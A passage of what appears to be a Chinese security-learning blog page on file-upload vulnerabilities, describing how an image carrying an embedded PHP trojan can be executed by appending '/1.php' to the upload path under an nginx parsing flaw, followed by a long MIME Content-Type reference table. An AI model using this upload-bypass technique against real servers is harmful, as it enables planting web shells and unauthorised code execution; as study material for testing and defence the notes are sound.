href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3></li><li>一般的文件上传不允许上传脚本格式的<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3></li></ol><h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol><li>假设上传了一个木马含在图片里的文件,直接访问上传路径解析不出来，按理来说应该解析图片的同时应该解析出phpinfo()的脚本函数，但是没有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182905.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713183140.png"></li><li>在上传路径后面加上/1.php   (文件的名字不重要，重要的是文件类型是php)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182720.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716084818.png"></li><li>解析漏洞是看搭建的平台的，例如apache和nginx的</li><li>nginx是可以将图片格式作为php格式执行</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="Contant-type"><a href="#Contant-type" class="headerlink" title="Contant-type"></a>Contant-type</h4><ol><li>内容类型，一般指的是网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定接收方以什么形式，什么编码解读这个文件</li><li>ContentType属性指定响应的 HTTP内容类型。如果未指定 ContentType，默认为TEXT/HTML</li><li>application/octet-stream 字节流，浏览器处理字节流的默认方式就是下载，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120216.png"><pre class="line-numbers language-none"><code class="language-none">最重要的1. application&#x2F;octet-stream 字节流，浏览器处理字节流的默认方式就是下载       2. image&#x2F;png 图片类型，将会以图片类型解析&quot;.*&quot;&#x3D;&quot;application&#x2F;octet-stream&quot;&quot;.001&quot;&#x3D;&quot;application&#x2F;x-001&quot;&quot;.301&quot;&#x3D;&quot;application&#x2F;x-301&quot;&quot;.323&quot;&#x3D;&quot;text&#x2F;h323&quot;&quot;.906&quot;&#x3D;&quot;application&#x2F;x-906&quot;&quot;.907&quot;&#x3D;&quot;drawing&#x2F;907&quot;&quot;.a11&quot;&#x3D;&quot;application&#x2F;x-a11&quot;&quot;.acp&quot;&#x3D;&quot;audio&#x2F;x-mei-aac&quot;&quot;.ai&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.aif&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.aifc&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.aiff&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.anv&quot;&#x3D;&quot;application&#x2F;x-anv&quot;&quot;.asa&quot;&#x3D;&quot;text&#x2F;asa&quot;&quot;.asf&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;&quot;.asp&quot;&#x3D;&quot;text&#x2F;asp&quot;&quot;.asx&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;&quot;.au&quot;&#x3D;&quot;audio&#x2F;basic&quot;&quot;.avi&quot;&#x3D;&quot;video&#x2F;avi&quot;&quot;.awf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.workflow&quot;&quot;.biz&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.bmp&quot;&#x3D;&quot;application&#x2F;x-bmp&quot;&quot;.bot&quot;&#x3D;&quot;application&#x2F;x-bot&quot;&quot;.c4t&quot;&#x3D;&quot;application&#x2F;x-c4t&quot;&quot;.c90&quot;&#x3D;&quot;application&#x2F;x-c90&quot;&quot;.cal&quot;&#x3D;&quot;application&#x2F;x-cals&quot;&quot;.cat&quot;&#x3D;&quot;application&#x2F;s-pki.seccat&quot;&quot;.cdf&quot;&#x3D;&quot;application&#x2F;x-netcdf&quot;&quot;.cdr&quot;&#x3D;&quot;application&#x2F;x-cdr&quot;&quot;.cel&quot;&#x3D;&quot;application&#x2F;x-cel&quot;&quot;.cer&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.cg4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.cgm&quot;&#x3D;&quot;application&#x2F;x-cgm&quot;&quot;.cit&quot;&#x3D;&quot;application&#x2F;x-cit&quot;&quot;.class&quot;&#x3D;&quot;java&#x2F;*&quot;&quot;.cml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.cmp&quot;&#x3D;&quot;application&#x2F;x-cmp&quot;&quot;.cmx&quot;&#x3D;&quot;application&#x2F;x-cmx&quot;&quot;.cot&quot;&#x3D;&quot;application&#x2F;x-cot&quot;&quot;.crl&quot;&#x3D;&quot;application&#x2F;pkix-crl&quot;&quot;.crt&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.csi&quot;&#x3D;&quot;application&#x2F;x-csi&quot;&quot;.css&quot;&#x3D;&quot;text&#x2F;css&quot;&quot;.cut&quot;&#x3D;&quot;application&#x2F;x-cut&quot;&quot;.dbf&quot;&#x3D;&quot;application&#x2F;x-dbf&quot;&quot;.dbm&quot;&#x3D;&quot;application&#x2F;x-dbm&quot;&quot;.dbx&quot;&#x3D;&quot;application&#x2F;x-dbx&quot;&quot;.dcd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.dcx&quot;&#x3D;&quot;application&#x2F;x-dcx&quot;&quot;.der&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.dgn&quot;&#x3D;&quot;application&#x2F;x-dgn&quot;&quot;.dib&quot;&#x3D;&quot;application&#x2F;x-dib&quot;&quot;.dll&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;&quot;.doc&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.dot&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.drw&quot;&#x3D;&quot;application&#x2F;x-drw&quot;&quot;.dtd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.dwf&quot;&#x3D;&quot;Model&#x2F;vnd.dwf&quot;&quot;.dwf&quot;&#x3D;&quot;application&#x2F;x-dwf&quot;&quot;.dwg&quot;&#x3D;&quot;application&#x2F;x-dwg&quot;&quot;.dxb&quot;&#x3D;&quot;application&#x2F;x-dxb&quot;&quot;.dxf&quot;&#x3D;&quot;application&#x2F;x-dxf&quot;&quot;.edn&quot;&#x3D;&quot;application&#x2F;vnd.adobe.edn&quot;&quot;.emf&quot;&#x3D;&quot;application&#x2F;x-emf&quot;&quot;.eml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.ent&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.epi&quot;&#x3D;&quot;application&#x2F;x-epi&quot;&quot;.eps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;&quot;.eps&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.etd&quot;&#x3D;&quot;application&#x2F;x-ebx&quot;&quot;.exe&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;&quot;.fax&quot;&#x3D;&quot;image&#x2F;fax&quot;&quot;.fdf&quot;&#x3D;&quot;application&#x2F;vnd.fdf&quot;&quot;.fif&quot;&#x3D;&quot;application&#x2F;fractals&quot;&quot;.fo&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.frm&quot;&#x3D;&quot;application&#x2F;x-frm&quot;&quot;.g4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.gbr&quot;&#x3D;&quot;application&#x2F;x-gbr&quot;&quot;.gcd&quot;&#x3D;&quot;application&#x2F;x-gcd&quot;&quot;.gif&quot;&#x3D;&quot;image&#x2F;gif&quot;&quot;.gl2&quot;&#x3D;&quot;application&#x2F;x-gl2&quot;&quot;.gp4&quot;&#x3D;&quot;application&#x2F;x-gp4&quot;&quot;.hgl&quot;&#x3D;&quot;application&#x2F;x-hgl&quot;&quot;.hmr&quot;&#x3D;&quot;application&#x2F;x-hmr&quot;&quot;.hpg&quot;&#x3D;&quot;application&#x2F;x-hpgl&quot;&quot;.hpl&quot;&#x3D;&quot;application&#x2F;x-hpl&quot;&quot;.hqx&quot;&#x3D;&quot;application&#x2F;mac-binhex40&quot;&quot;.hrf&quot;&#x3D;&quot;application&#x2F;x-hrf&quot;&quot;.hta&quot;&#x3D;&quot;application&#x2F;hta&quot;&quot;.htc&quot;&#x3D;&quot;text&#x2F;x-component&quot;&quot;.htm&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.html&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.htt&quot;&#x3D;&quot;text&#x2F;webviewhtml&quot;&quot;.htx&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.icb&quot;&#x3D;&quot;application&#x2F;x-icb&quot;&quot;.ico&quot;&#x3D;&quot;image&#x2F;x-icon&quot;&quot;.ico&quot;&#x3D;&quot;application&#x2F;x-ico&quot;&quot;.iff&quot;&#x3D;&quot;application&#x2F;x-iff&quot;&quot;.ig4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.igs&quot;&#x3D;&quot;application&#x2F;x-igs&quot;&quot;.iii&quot;&#x3D;&quot;application&#x2F;x-iphone&quot;&quot;.img&quot;&#x3D;&quot;application&#x2F;x-img&quot;&quot;.ins&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;&quot;.isp&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;&quot;.IVF&quot;&#x3D;&quot;video&#x2F;x-ivf&quot;&quot;.java&quot;&#x3D;&quot;java&#x2F;*&quot;&quot;.jfif&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpe&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpe&quot;&#x3D;&quot;application&#x2F;x-jpe&quot;&quot;.jpeg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpg&quot;&#x3D;&quot;application&#x2F;x-jpg&quot;&quot;.js&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.jsp&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.la1&quot;&#x3D;&quot;audio&#x2F;x-liquid-file&quot;&quot;.lar&quot;&#x3D;&quot;application&#x2F;x-laplayer-reg&quot;&quot;.latex&quot;&#x3D;&quot;application&#x2F;x-latex&quot;&quot;.lavs&quot;&#x3D;&quot;audio&#x2F;x-liquid-secure&quot;&quot;.lbm&quot;&#x3D;&quot;application&#x2F;x-lbm&quot;&quot;.lmsff&quot;&#x3D;&quot;audio&#x2F;x-la-lms&quot;&quot;.ls&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.ltr&quot;&#x3D;&quot;application&#x2F;x-ltr&quot;&quot;.m1v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.m2v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.m3u&quot;&#x3D;&quot;audio&#x2F;mpegurl&quot;&quot;.m4e&quot;&#x3D;&quot;video&#x2F;mpeg4&quot;&quot;.mac&quot;&#x3D;&quot;application&#x2F;x-mac&quot;&quot;.man&quot;&#x3D;&quot;application&#x2F;x-troff-man&quot;&quot;.math&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mdb&quot;&#x3D;&quot;application&#x2F;msaccess&quot;&quot;.mdb&quot;&#x3D;&quot;application&#x2F;x-mdb&quot;&quot;.mfp&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;&quot;.mht&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.mhtml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.mi&quot;&#x3D;&quot;application&#x2F;x-mi&quot;&quot;.mid&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.midi&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.mil&quot;&#x3D;&quot;application&#x2F;x-mil&quot;&quot;.mml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mnd&quot;&#x3D;&quot;audio&#x2F;x-musicnet-download&quot;&quot;.mns&quot;&#x3D;&quot;audio&#x2F;x-musicnet-stream&quot;&quot;.mocha&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.movie&quot;&#x3D;&quot;video&#x2F;x-sgi-movie&quot;&quot;.mp1&quot;&#x3D;&quot;audio&#x2F;mp1&quot;&quot;.mp2&quot;&#x3D;&quot;audio&#x2F;mp2&quot;&quot;.mp2v&quot;&#x3D;&quot;video&#x2F;mpeg&quot;&quot;.mp3&quot;&#x3D;&quot;audio&#x2F;mp3&quot;&quot;.mp4&quot;&#x3D;&quot;video&#x2F;mp4&quot;&quot;.mpa&quot;&#x3D;&quot;video&#x2F;x-mpg&quot;&quot;.mpd&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mpe&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.mpeg&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpg&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpga&quot;&#x3D;&quot;audio&#x2F;rn-mpeg&quot;&quot;.mpp&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mps&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.mpt&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mpv&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpv2&quot;&#x3D;&quot;video&#x2F;mpeg&quot;&quot;.mpw&quot;&#x3D;&quot;application&#x2F;s-project&quot;&quot;.mpx&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mtx&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mxp&quot;&#x3D;&quot;application&#x2F;x-mmxp&quot;&quot;.net&quot;&#x3D;&quot;image&#x2F;pnetvue&quot;&quot;.nrf&quot;&#x3D;&quot;application&#x2F;x-nrf&quot;&quot;.nws&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.odc&quot;&#x3D;&quot;text&#x2F;x-ms-odc&quot;&quot;.out&quot;&#x3D;&quot;application&#x2F;x-out&quot;&quot;.p10&quot;&#x3D;&quot;application&#x2F;pkcs10&quot;&quot;.p12&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;&quot;.p7b&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;&quot;.p7c&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;&quot;.p7m&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;&quot;.p7r&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certreqresp&quot;&quot;.p7s&quot;&#x3D;&quot;application&#x2F;pkcs7-signature&quot;&quot;.pc5&quot;&#x3D;&quot;application&#x2F;x-pc5&quot;&quot;.pci&quot;&#x3D;&quot;application&#x2F;x-pci&quot;&quot;.pcl&quot;&#x3D;&quot;application&#x2F;x-pcl&quot;&quot;.pcx&quot;&#x3D;&quot;application&#x2F;x-pcx&quot;&quot;.pdf&quot;&#x3D;&quot;application&#x2F;pdf&quot;&quot;.pdx&quot;&#x3D;&quot;application&#x2F;vnd.adobe.pdx&quot;&quot;.pfx&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;&quot;.pgl&quot;&#x3D;&quot;application&#x2F;x-pgl&quot;&quot;.pic&quot;&#x3D;&quot;application&#x2F;x-pic&quot;&quot;.pko&quot;&#x3D;&quot;application-pki.pko&quot;&quot;.pl&quot;&#x3D;&quot;application&#x2F;x-perl&quot;&quot;.plg&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.pls&quot;&#x3D;&quot;audio&#x2F;scpls&quot;&quot;.plt&quot;&#x3D;&quot;application&#x2F;x-plt&quot;&quot;.png&quot;&#x3D;&quot;image&#x2F;png&quot;&quot;.png&quot;&#x3D;&quot;application&#x2F;x-png&quot;&quot;.pot&quot;&#x3D;&quot;applications-powerpoint&quot;&quot;.ppa&quot;&#x3D;&quot;application&#x2F;vs-powerpoint&quot;&quot;.ppm&quot;&#x3D;&quot;application&#x2F;x-ppm&quot;&quot;.pps&quot;&#x3D;&quot;application-powerpoint&quot;&quot;.ppt&quot;&#x3D;&quot;applications-powerpoint&quot;&quot;.ppt&quot;&#x3D;&quot;application&#x2F;x-ppt&quot;&quot;.pr&quot;&#x3D;&quot;application&#x2F;x-pr&quot;&quot;.prf&quot;&#x3D;&quot;application&#x2F;pics-rules&quot;&quot;.prn&quot;&#x3D;&quot;application&#x2F;x-prn&quot;&quot;.prt&quot;&#x3D;&quot;application&#x2F;x-prt&quot;&quot;.ps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;&quot;.ps&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.ptn&quot;&#x3D;&quot;application&#x2F;x-ptn&quot;&quot;.pwz&quot;&#x3D;&quot;application&#x2F;powerpoint&quot;&quot;.r3t&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext3d&quot;&quot;.ra&quot;&#x3D;&quot;audio&#x2F;vnd.rn-realaudio&quot;&quot;.ram&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;&quot;.ras&quot;&#x3D;&quot;application&#x2F;x-ras&quot;&quot;.rat&quot;&#x3D;&quot;application&#x2F;rat-file&quot;&quot;.rdf&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.rec&quot;&#x3D;&quot;application&#x2F;vnd.rn-recording&quot;&quot;.red&quot;&#x3D;&quot;application&#x2F;x-red&quot;&quot;.rgb&quot;&#x3D;&quot;application&#x2F;x-rgb&quot;&quot;.rjs&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjs&quot;&quot;.rjt&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjt&quot;&quot;.rlc&quot;&#x3D;&quot;application&#x2F;x-rlc&quot;&quot;.rle&quot;&#x3D;&quot;application&#x2F;x-rle&quot;&quot;.rm&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia&quot;&quot;.rmf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.rmf&quot;&quot;.rmi&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.rmj&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmj&quot;&quot;.rmm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;&quot;.rmp&quot;&#x3D;&quot;application&#x2F;vnd.rn-rn_music_package&quot;&quot;.rms&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-secure&quot;&quot;.rmvb&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-vbr&quot;&quot;.rmx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmx&quot;&quot;.rnx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realplayer&quot;&quot;.rp&quot;&#x3D;&quot;image&#x2F;vnd.rn-realpix&quot;&quot;.rpm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio-plugin&quot;&quot;.rsml&quot;&#x3D;&quot;application&#x2F;vnd.rn-rsml&quot;&quot;.rt&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext&quot;&quot;.rtf&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.rtf&quot;&#x3D;&quot;application&#x2F;x-rtf&quot;&quot;.rv&quot;&#x3D;&quot;video&#x2F;vnd.rn-realvideo&quot;&quot;.sam&quot;&#x3D;&quot;application&#x2F;x-sam&quot;&quot;.sat&quot;&#x3D;&quot;application&#x2F;x-sat&quot;&quot;.sdp&quot;&#x3D;&quot;application&#x2F;sdp&quot;&quot;.sdw&quot;&#x3D;&quot;application&#x2F;x-sdw&quot;&quot;.sit&quot;&#x3D;&quot;application&#x2F;x-stuffit&quot;&quot;.slb&quot;&#x3D;&quot;application&#x2F;x-slb&quot;&quot;.sld&quot;&#x3D;&quot;application&#x2F;x-sld&quot;&quot;.slk&quot;&#x3D;&quot;drawing&#x2F;x-slk&quot;&quot;.smi&quot;&#x3D;&quot;application&#x2F;smil&quot;&quot;.smil&quot;&#x3D;&quot;application&#x2F;smil&quot;&quot;.smk&quot;&#x3D;&quot;application&#x2F;x-smk&quot;&quot;.snd&quot;&#x3D;&quot;audio&#x2F;basic&quot;&quot;.sol&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.sor&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.spc&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;&quot;.spl&quot;&#x3D;&quot;application&#x2F;futuresplash&quot;&quot;.spp&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.ssm&quot;&#x3D;&quot;application&#x2F;streamingmedia&quot;&quot;.sst&quot;&#x3D;&quot;application-pki.certstore&quot;&quot;.stl&quot;&#x3D;&quot;application&#x2F;-pki.stl&quot;&quot;.stm&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.sty&quot;&#x3D;&quot;application&#x2F;x-sty&quot;&quot;.svg&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.swf&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;&quot;.tdf&quot;&#x3D;&quot;application&#x2F;x-tdf&quot;&quot;.tg4&quot;&#x3D;&quot;application&#x2F;x-tg4&quot;&quot;.tga&quot;&#x3D;&quot;application&#x2F;x-tga&quot;&quot;.tif&quot;&#x3D;&quot;image&#x2F;tiff&quot;&quot;.tif&quot;&#x3D;&quot;application&#x2F;x-tif&quot;&quot;.tiff&quot;&#x3D;&quot;image&#x2F;tiff&quot;&quot;.tld&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.top&quot;&#x3D;&quot;drawing&#x2F;x-top&quot;&quot;.torrent&quot;&#x3D;&quot;application&#x2F;x-bittorrent&quot;&quot;.tsd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.txt&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.uin&quot;&#x3D;&quot;application&#x2F;x-icq&quot;&quot;.uls&quot;&#x3D;&quot;text&#x2F;iuls&quot;&quot;.vcf&quot;&#x3D;&quot;text&#x2F;x-vcard&quot;&quot;.vda&quot;&#x3D;&quot;application&#x2F;x-vda&quot;&quot;.vdx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.vpg&quot;&#x3D;&quot;application&#x2F;x-vpeg005&quot;&quot;.vsd&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vsd&quot;&#x3D;&quot;application&#x2F;x-vsd&quot;&quot;.vss&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vst&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vst&quot;&#x3D;&quot;application&#x2F;x-vst&quot;&quot;.vsw&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vsx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vtx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vxml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.wav&quot;&#x3D;&quot;audio&#x2F;wav&quot;&quot;.wax&quot;&#x3D;&quot;audio&#x2F;x-ms-wax&quot;&quot;.wb1&quot;&#x3D;&quot;application&#x2F;x-wb1&quot;&quot;.wb2&quot;&#x3D;&quot;application&#x2F;x-wb2&quot;&quot;.wb3&quot;&#x3D;&quot;application&#x2F;x-wb3&quot;&quot;.wbmp&quot;&#x3D;&quot;image&#x2F;vnd.wap.wbmp&quot;&quot;.wiz&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.wk3&quot;&#x3D;&quot;application&#x2F;x-wk3&quot;&quot;.wk4&quot;&#x3D;&quot;application&#x2F;x-wk4&quot;&quot;.wkq&quot;&#x3D;&quot;application&#x2F;x-wkq&quot;&quot;.wks&quot;&#x3D;&quot;application&#x2F;x-wks&quot;&quot;.wm&quot;&#x3D;&quot;video&#x2F;x-ms-wm&quot;&quot;.wma&quot;&#x3D;&quot;audio&#x2F;x-ms-wma&quot;&quot;.wmd&quot;&#x3D;&quot;application&#x2F;x-ms-wmd&quot;&quot;.wmf&quot;&#x3D;&quot;application&#x2F;x-wmf&quot;&quot;.wml&quot;&#x3D;&quot;text&#x2F;vnd.wap.wml&quot;&quot;.wmv&quot;&#x3D;&quot;video&#x2F;x-ms-wmv&quot;&quot;.wmx&quot;&#x3D;&quot;video&#x2F;x-ms-wmx&quot;&quot;.wmz&quot;&#x3D;&quot;application&#x2F;x-ms-wmz&quot;&quot;.wp6&quot;&#x3D;&quot;application&#x2F;x-wp6&quot;&quot;.wpd&quot;&#x3D;&quot;application&#x2F;x-wpd&quot;&quot;.wpg&quot;&#x3D;&quot;application&#x2F;x-wpg&quot;&quot;.wpl&quot;&#x3D;&quot;application&#x2F;-wpl&quot;&quot;.wq1&quot;&#x3D;&quot;application&#x2F;x-wq1&quot;&quot;.wr1&quot;&#x3D;&quot;application&#x2F;x-wr1&quot;&quot;.wri&quot;&#x3D;&quot;application&#x2F;x-wri&quot;&quot;.wrk&quot;&#x3D;&quot;application&#x2F;x-wrk&quot;&quot;.ws&quot;&#x3D;&quot;application&#x2F;x-ws&quot;&quot;.ws2&quot;&#x3D;&quot;application&#x2F;x-ws&quot;&quot;.wsc&quot;&#x3D;&quot;text&#x2F;scriptlet&quot;&quot;.wsdl&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.wvx&quot;&#x3D;&quot;video&#x2F;x-ms-wvx&quot;&quot;.xdp&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xdp&quot;&quot;.xdr&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xfd&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfd&quot;&quot;.xfdf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfdf&quot;&quot;.xhtml&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.xls&quot;&#x3D;&quot;application&#x2F;-excel&quot;&quot;.xls&quot;&#x3D;&quot;application&#x2F;x-xls&quot;&quot;.xlw&quot;&#x3D;&quot;application&#x2F;x-xlw&quot;&quot;.xml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xpl&quot;&#x3D;&quot;audio&#x2F;scpls&quot;&quot;.xq&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xql&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xquery&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xsd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xsl&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xslt&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xwd&quot;&#x3D;&quot;application&#x2F;x-xwd&quot;&quot;.x_b&quot;&#x3D;&quot;application&#x2F;x-x_b&quot;&quot;.x_t&quot;&#x3D;&quot;application&#x2F;x-x_t&quot;Office2007对应的值:&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.template&quot; (for .docx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation&quot; (for .pptx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slideshow&quot; (for .ppsx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.template&quot; (for .potx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot; (for .xlsx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.template&quot; (for .xltx files)相对于Office2003是这样的Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s